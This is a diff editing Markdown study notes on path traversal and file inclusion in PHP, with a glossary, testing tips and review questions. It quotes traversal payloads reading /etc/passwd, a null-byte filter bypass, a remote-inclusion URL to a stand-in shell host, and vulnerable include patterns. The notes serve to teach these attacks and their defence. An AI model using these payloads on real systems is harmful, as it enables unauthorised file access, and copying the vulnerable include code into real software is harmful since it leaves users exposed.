@@ -19,9 +19,8 @@
 | **Path Traversal**              | A vulnerability where attackers manipulate paths to access unauthorized files outside the intended directory. | Using `../../../../etc/passwd` to traverse directories and access sensitive files. |
 | **Absolute Path**               | A full path to a file or directory from the root of the filesystem.                                           | `/var/www/html/config.php`.                                                        |
 | **Relative Path**               | A path relative to the current working directory.                                                             | `../config.php` or `../../etc/passwd`.                                             |
-|                                 |                                                                                                               |                                                                                    |
 
----
+----
 
 ## 📝 **Understanding Key Concepts**
 
@@ -33,13 +32,7 @@ Modern applications are often modular to improve maintainability and scalability
 - Files are dynamically included using mechanisms like `include` (PHP), `import` (Python), or `require` (Node.js).
 - Example:
     
-    ```php
-    <?php
-    include('header.php'); // Includes header module
-    include($_GET['file']); // Dynamically includes a file based on user input
-    ?>
-    ```
-    
+![[Pasted image 20250104231338.png]]
 
 ---
 
@@ -162,11 +155,9 @@ http://example.com/index.php?file=http://malicious.com/shell.php
         - Add extensions: `.php`, `.txt`, `.log`.
         - Use null byte terminators (`%00`) to bypass filters:
             
-            bash
-            
-            Copy code
-            
-            `../../etc/passwd%00`
+```bash
+../../etc/passwd%00
+````
             
 4. **Testing for Remote File Inclusion (RFI)**
     
@@ -196,19 +187,11 @@ http://example.com/index.php?file=http://malicious.com/shell.php
     
     - Example:
         
-        php
-        
-        Copy code
-        
         `include($_GET['page']);   require($_POST['file']);`  
         
 2. **User-Controlled Input in File Paths**:
     
     - Concatenating user input with file paths:
-        
-        php
-        
-        Copy code
         
         `$file = $_GET['file']; include("/templates/" . $file);`
         
@@ -231,8 +214,6 @@ http://example.com/index.php?file=http://malicious.com/shell.php
     - Automate testing for traversal sequences and file inclusion payloads.
 
 ---
-
-
 
 ## ✅ **Actionable Insights**
 
@@ -269,13 +250,3 @@ http://example.com/index.php?file=http://malicious.com/shell.php
 5. **What is a practical way to restrict file inclusion to specific directories in PHP?**
     
     - **Answer:** _Use the `open_basedir` directive to limit file access to specific directories._
-
----
-
-### **Related Topics**
-
-- `[[Path Traversal Vulnerabilities]]`
-- `[[Input Validation Best Practices]]`
-- `[[PHP Security Tips]]`
-
-Let me know if these notes meet your expectations or if you’d like adjustments! 🚀
